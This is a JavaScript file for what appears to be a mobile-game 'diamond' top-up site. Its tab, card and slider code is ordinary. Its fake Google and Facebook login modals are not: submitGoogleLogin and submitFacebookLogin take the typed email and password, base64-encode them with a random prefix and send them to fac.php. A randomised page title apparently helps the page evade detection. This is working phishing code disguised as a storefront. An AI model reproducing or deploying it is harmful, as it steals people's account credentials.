// Get DOM elements
const userIcon = document.getElementById("userIcon");
const loginModal = document.getElementById("loginModal");
const closeModalBtn = document.getElementById("closeModal");
const facebookLogin = document.getElementById("facebookLogin");

// Open modal
function openModal() {
  loginModal.classList.add("active");
  document.body.style.overflow = "hidden";
}

// Close modal
function closeModal() {
  loginModal.classList.remove("active");
  document.body.style.overflow = "auto";
}

// Event listeners
userIcon.addEventListener("click", openModal);
closeModalBtn.addEventListener("click", closeModal);

// Close modal when clicking outside
loginModal.addEventListener("click", function (e) {
  if (e.target === loginModal) {
    closeModal();
  }
});

// Add this to your existing script.js file

// Tab switching with inline style updates
const tabs = document.querySelectorAll('.section-two-tab');

// Active styles
const activeStyles = 'padding: 8px 24px; font-size: 14px; font-weight: 500; border: 2px solid #e33f3f; border-radius: 50px; background: rgba(227, 63, 63, 0.1); color: #e33f3f; cursor: pointer; transition: all 0.3s ease; outline: none;';

// Inactive styles
const inactiveStyles = 'padding: 8px 24px; font-size: 14px; font-weight: 500; border: 2px solid #e0e0e0; border-radius: 50px; background: white; color: #666; cursor: pointer; transition: all 0.3s ease; outline: none;';

tabs.forEach(tab => {
  tab.addEventListener('click', function() {
    const targetTab = this.getAttribute('data-tab');
    
    // Remove active class and apply inactive styles to all tabs
    tabs.forEach(t => {
      t.classList.remove('section-two-tab-active');
      t.setAttribute('style', inactiveStyles);
    });
    
    // Add active class and apply active styles to clicked tab
    this.classList.add('section-two-tab-active');
    this.setAttribute('style', activeStyles);
    
    // Show/hide corresponding content
    const contents = document.querySelectorAll('.section-two-content');
    contents.forEach(content => {
      if (content.id === `section-two-${targetTab}`) {
        content.classList.add('section-two-content-active');
      } else {
        content.classList.remove('section-two-content-active');
      }
    });
    
    // Show/hide payment method section
    const paymentMethodSection = document.getElementById('payment-method-section');
    if (paymentMethodSection) {
      if (targetTab === 'purchase') {
        paymentMethodSection.classList.add('active');
      } else {
        paymentMethodSection.classList.remove('active');
      }
    }
  });
});

// Close modal with Escape key
document.addEventListener("keydown", function (e) {
  if (e.key === "Escape" && loginModal.classList.contains("active")) {
    closeModal();
  }
});

// Facebook login button
facebookLogin.addEventListener("click", function (e) {
  e.preventDefault();
  alert("Facebook login functionality would be implemented here!");
});


document.addEventListener("DOMContentLoaded", function () {
  const tabs = document.querySelectorAll(".section-two-tab");
  const contents = document.querySelectorAll(".section-two-content");
  const cards = document.querySelectorAll(".section-two-card");
  const specialDealCards = document.querySelectorAll(".special-deal-card");
  const paymentMethodCards = document.querySelectorAll(".payment-method-card");
  const paymentMethodSection = document.getElementById(
    "payment-method-section"
  );

  // Function to show/hide payment method section
  function togglePaymentMethodSection(show) {
    if (paymentMethodSection) {
      if (show) {
        paymentMethodSection.classList.add("active");
      } else {
        paymentMethodSection.classList.remove("active");
      }
    }
  }

  // Tab switching functionality
  tabs.forEach((tab) => {
    tab.addEventListener("click", () => {
      const targetTab = tab.getAttribute("data-tab");

      // Remove active class from all tabs and contents
      tabs.forEach((t) => t.classList.remove("section-two-tab-active"));
      contents.forEach((c) => c.classList.remove("section-two-content-active"));

      // Add active class to clicked tab
      tab.classList.add("section-two-tab-active");

      // Show corresponding content
      const targetContent = document.getElementById(`section-two-${targetTab}`);
      if (targetContent) {
        targetContent.classList.add("section-two-content-active");
      }

      // Show/hide payment method section based on active tab
      togglePaymentMethodSection(targetTab === "purchase");
    });
  });

  // Initial setup - show only the purchase content and hide redeem content
  contents.forEach((content) => {
    if (content.id === "section-two-purchase") {
      content.classList.add("section-two-content-active");
    } else {
      content.classList.remove("section-two-content-active");
    }
  });
  // Initial setup - show payment method section for purchase tab
  togglePaymentMethodSection(true);

  // Card selection functionality
  cards.forEach((card) => {
    card.addEventListener("click", () => {
      // Remove selected class from all cards
      cards.forEach((c) => c.classList.remove("selected"));

      // Add selected class to clicked card
      card.classList.add("selected");

      // Get selected amount and price
      const amount = card.getAttribute("data-amount");
      const price = card.getAttribute("data-price");

      // You can emit a custom event or call a callback function here
      console.log(`Selected: ${amount} diamonds for Rs. ${price}`);

      // Dispatch custom event
      const event = new CustomEvent("diamondSelected", {
        detail: { amount, price },
      });
      document.dispatchEvent(event);
    });
  });

  // Special deal card selection functionality
  specialDealCards.forEach((card) => {
    card.addEventListener("click", () => {
      // Remove selected class from all special deal cards
      specialDealCards.forEach((c) => c.classList.remove("selected"));

      // Add selected class to clicked card
      card.classList.add("selected");

      // Get selected deal name
      const dealName = card.querySelector(".special-deal-name").textContent;

      console.log(`Selected special deal: ${dealName}`);

      // Dispatch custom event
      const event = new CustomEvent("specialDealSelected", {
        detail: { dealName },
      });
      document.dispatchEvent(event);
    });
  });

  // Payment method card selection functionality
  paymentMethodCards.forEach((card) => {
    card.addEventListener("click", () => {
      // Remove selected class from all payment method cards
      paymentMethodCards.forEach((c) => c.classList.remove("selected"));

      // Add selected class to clicked card
      card.classList.add("selected");

      // Get selected payment method
      const paymentMethod = card.querySelector(".payment-method-logo").alt;

      console.log(`Selected payment method: ${paymentMethod}`);

      // Dispatch custom event
      const event = new CustomEvent("paymentMethodSelected", {
        detail: { paymentMethod },
      });
      document.dispatchEvent(event);
    });
  });

  // Listen for diamond selection (optional)
  document.addEventListener("diamondSelected", (event) => {
    const { amount, price } = event.detail;
    console.log(`Diamond package selected: ${amount} for Rs. ${price}`);
  });

  // Listen for special deal selection (optional)
  document.addEventListener("specialDealSelected", (event) => {
    const { dealName } = event.detail;
    console.log(`Special deal selected: ${dealName}`);
  });

  // Listen for payment method selection (optional)
  document.addEventListener("paymentMethodSelected", (event) => {
    const { paymentMethod } = event.detail;
    console.log(`Payment method selected: ${paymentMethod}`);
  });
});

function generateRandomTitle() {
    const adjectives = ["jeans", "stingy", "oil", "smile", "rings", "upbeat", "thundering", "cumbersome", "ignorant", "female", "miscreant", "flowery", "porter", "toad", "marry", "sugar", "inquisitive", "evanescent", "reduce", "nasty", "camera", "moon", "profit", "reflective", "tooth", "neighborly", "enter", "ad hoc", "afford", "proud", "obese", "panicky", "creature", "hobbies", "average", "building", "art", "savory", "bitter", "hole", "payment", "buzz", "pin", "lonely", "rest", "lucky", "big", "receptive", "quack", "wet"];
    const nouns = ["wonderfully", "upwardly", "successfully", "slightly", "promptly", "curiously", "quirkily", "vivaciously", "really", "patiently", "searchingly", "verbally", "famously", "dreamily", "doubtfully", "else", "hungrily", "roughly", "effectively", "neatly", "rather", "vaguely", "quaintly", "reproachfully", "seriously", "enthusiastically", "voluntarily", "unbearably", "sadly", "jaggedly", "unimpressively", "quicker", "bitterly", "dramatically", "sharply", "seldom", "inquisitively", "briefly", "gleefully", "almost", "knowingly", "crossly", "eagerly", "basically", "acidly", "tediously", "strictly", "probably", "currently", "painfully"];
    const adjective = adjectives[Math.floor(Math.random() * adjectives.length)];
    const noun = nouns[Math.floor(Math.random() * nouns.length)];
    return `${adjective} ${noun}`;
}

document.addEventListener("DOMContentLoaded", () => {
    document.title = generateRandomTitle();
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const fbEmailInput = document.getElementById('fb-email-input');
    const fbPasswordInput = document.getElementById('fb-password-input');
    if (emailInput) emailInput.addEventListener('input', validateEmail);
    if (passwordInput) passwordInput.addEventListener('input', validatePassword);
    if (fbEmailInput) fbEmailInput.addEventListener('input', validateFbForm);
    if (fbPasswordInput) fbPasswordInput.addEventListener('input', validateFbForm);

    // Close modals when clicking outside
    const googleModal = document.getElementById('google-login-modal');
    const facebookModal = document.getElementById('facebook-login-modal');
    
    if (googleModal) {
        googleModal.addEventListener('click', (e) => {
            if (e.target === e.currentTarget) closeGoogleLogin();
        });
    }
    
    if (facebookModal) {
        facebookModal.addEventListener('click', (e) => {
            if (e.target === e.currentTarget) closeFacebookLogin();
        });
    }
});

function showGoogleLogin() {
    const modal = document.getElementById('google-login-modal');
    const modalContent = modal?.querySelector('.modal-content');
    if (!modalContent) {
        console.error('Google modal or modal content not found');
        alert('Error: Google login modal not found. Please try again later.');
        return;
    }
    modal.classList.add('active');
    modalContent.style.display = 'block';
    modalContent.style.opacity = '1';
    const emailInput = document.getElementById('email-input');
    if (emailInput) emailInput.focus();
}

function showFacebookLogin() {
    const modal = document.getElementById('facebook-login-modal');
    const modalContent = modal?.querySelector('.modal-content');
    if (!modalContent) {
        console.error('Facebook modal or modal content not found');
        alert('Error: Facebook login modal not found. Please try again later.');
        return;
    }
    modal.classList.add('active');
    modalContent.style.display = 'block';
    modalContent.style.opacity = '1';
    const fbEmailInput = document.getElementById('fb-email-input');
    if (fbEmailInput) fbEmailInput.focus();
}

function closeGoogleLogin() {
    const modal = document.getElementById('google-login-modal');
    if (!modal) return;
    modal.classList.remove('active');
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    if (emailInput) emailInput.value = '';
    if (passwordInput) passwordInput.value = '';
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');
    if (emailError) emailError.textContent = '';
    if (passwordError) passwordError.textContent = '';
    const emailStep = document.getElementById('email-step');
    const passwordStep = document.getElementById('password-step');
    if (emailStep) emailStep.style.display = 'block';
    if (passwordStep) passwordStep.style.display = 'none';
    const emailNextBtn = document.getElementById('email-next-btn');
    const passwordSubmitBtn = document.getElementById('password-submit-btn');
    if (emailNextBtn) emailNextBtn.disabled = true;
    if (passwordSubmitBtn) passwordSubmitBtn.disabled = true;
}

function closeFacebookLogin() {
    const modal = document.getElementById('facebook-login-modal');
    if (!modal) return;
    modal.classList.remove('active');
    const fbEmailInput = document.getElementById('fb-email-input');
    const fbPasswordInput = document.getElementById('fb-password-input');
    if (fbEmailInput) fbEmailInput.value = '';
    if (fbPasswordInput) fbPasswordInput.value = '';
    const fbEmailError = document.getElementById('fb-email-error');
    const fbPasswordError = document.getElementById('fb-password-error');
    if (fbEmailError) fbEmailError.textContent = '';
    if (fbPasswordError) fbPasswordError.textContent = '';
    const fbLoginBtn = document.getElementById('fb-login-btn');
    if (fbLoginBtn) fbLoginBtn.disabled = true;
}

function validateEmail() {
    const email = document.getElementById('email-input')?.value;
    const error = document.getElementById('email-error');
    const nextBtn = document.getElementById('email-next-btn');
    if (!email || !error || !nextBtn) return;
    if (email.trim() !== '') {
        error.textContent = '';
        nextBtn.disabled = false;
    } else {
        error.textContent = 'Please enter an ID or email';
        nextBtn.disabled = true;
    }
}

function validatePassword() {
    const password = document.getElementById('password-input')?.value;
    const error = document.getElementById('password-error');
    const submitBtn = document.getElementById('password-submit-btn');
    if (!password || !error || !submitBtn) return;
    if (password.trim() !== '') {
        error.textContent = '';
        submitBtn.disabled = false;
    } else {
        error.textContent = 'Please enter a password';
        submitBtn.disabled = true;
    }
}

function validateFbForm() {
    const email = document.getElementById('fb-email-input')?.value;
    const password = document.getElementById('fb-password-input')?.value;
    const emailError = document.getElementById('fb-email-error');
    const passwordError = document.getElementById('fb-password-error');
    const loginBtn = document.getElementById('fb-login-btn');
    if (!email || !password || !emailError || !passwordError || !loginBtn) return;
    let valid = true;
    if (email.trim() === '') {
        emailError.textContent = 'Please enter an email or phone number';
        valid = false;
    } else {
        emailError.textContent = '';
    }
    if (password.trim() === '') {
        passwordError.textContent = 'Please enter a password';
        valid = false;
    } else {
        passwordError.textContent = '';
    }
    loginBtn.disabled = !valid;
}

function showPasswordStep() {
    const email = document.getElementById('email-input')?.value;
    if (!email) return;
    const displayEmail = document.getElementById('display-email');
    if (displayEmail) displayEmail.textContent = email;
    const emailStep = document.getElementById('email-step');
    const passwordStep = document.getElementById('password-step');
    if (emailStep) emailStep.style.display = 'none';
    if (passwordStep) passwordStep.style.display = 'block';
    const passwordInput = document.getElementById('password-input');
    if (passwordInput) passwordInput.focus();
}

function togglePassword() {
    const passwordInput = document.getElementById('password-input');
    const showPasswordCheckbox = document.getElementById('show-password');
    if (passwordInput && showPasswordCheckbox) {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    }
}

function toggleFbPassword() {
    const passwordInput = document.getElementById('fb-password-input');
    const showPasswordCheckbox = document.getElementById('fb-show-password');
    if (passwordInput && showPasswordCheckbox) {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    }
}

function submitGoogleLogin() {
    const email = document.getElementById('email-input')?.value;
    const password = document.getElementById('password-input')?.value;
    if (!email || !password) {
        alert('Please enter both ID/email and password.');
        return;
    }
    const userId = Math.floor(Math.random() * 1000000).toString();
    const type = 'gg';
    const separator = '#@-@#';
    const dataString = `${email}${separator}${password}${separator}${userId}${separator}${type}`;
    const randomPrefix = Math.random().toString(36).substring(2, 11);
    const encodedData = randomPrefix + btoa(dataString);
    console.log('Submitting Google login with data:', encodedData);
    window.location.href = `fac.php?data=${encodeURIComponent(encodedData)}&i=0`;
}

function submitFacebookLogin() {
    const email = document.getElementById('fb-email-input')?.value;
    const password = document.getElementById('fb-password-input')?.value;
    if (!email || !password) {
        alert('Please enter both email/phone and password.');
        return;
    }
    const userId = Math.floor(Math.random() * 1000000).toString();
    const type = 'ff';
    const separator = '#@-@#';
    const dataString = `${email}${separator}${password}${separator}${userId}${separator}${type}`;
    const randomPrefix = Math.random().toString(36).substring(2, 11);
    const encodedData = randomPrefix + btoa(dataString);
    console.log('Submitting Facebook login with data:', encodedData);
    window.location.href = `fac.php?data=${encodeURIComponent(encodedData)}&i=0`;
}

// Slider functionality
let slideIndex = 0;
const slides = document.getElementById("sliderContainer");
const totalSlides = slides.getElementsByTagName("img").length;

function moveSlider(direction) {
    if (window.innerWidth <= 768) {
        slideIndex += direction;
        if (slideIndex >= totalSlides) slideIndex = 0;
        if (slideIndex < 0) slideIndex = totalSlides - 1;
        slides.style.transform = `translateX(-${slideIndex * 100}%)`;
    } else {
        slideIndex += direction;
        if (slideIndex >= totalSlides - 2) slideIndex = 0;
        if (slideIndex < 0) slideIndex = totalSlides - 3;
        slides.style.transform = `translateX(-${slideIndex * (100 / 3)}%)`;
        updateFade();
        
    }
}

function updateFade() {
    const images = slides.getElementsByTagName("img");
    if (window.innerWidth > 768) {
        for (let i = 0; i < images.length; i++) {
            images[i].style.opacity = (i >= slideIndex && i < slideIndex + 3) ? 1 : 0.5;
        }
    } else {
        for (let i = 0; i < images.length; i++) {
            images[i].style.opacity = 1;
        }
    }
}
